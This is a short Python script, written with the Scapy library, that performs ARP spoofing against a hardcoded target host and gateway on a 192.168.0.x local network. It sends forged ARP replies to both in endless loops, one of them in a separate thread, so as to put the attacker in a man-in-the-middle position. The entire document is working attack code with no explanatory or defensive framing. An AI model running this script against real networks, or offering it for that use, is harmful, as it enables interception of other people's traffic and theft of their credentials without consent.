#!/usr/bin/python

from scapy.all import *
import threading
target = "192.168.0.23"
gateway = "192.168.0.1"

poisonTarget = Ether() / ARP(pdst=target, psrc=gateway, op="is-at")
poisonGateway = Ether() / ARP(pdst=gateway, psrc=target, op="is-at")
def mITM():
    sendp(poisonTarget, inter=1, loop=True)

threading.Thread(target=mITM).start()
sendp(poisonGateway, inter=1, loop=True)
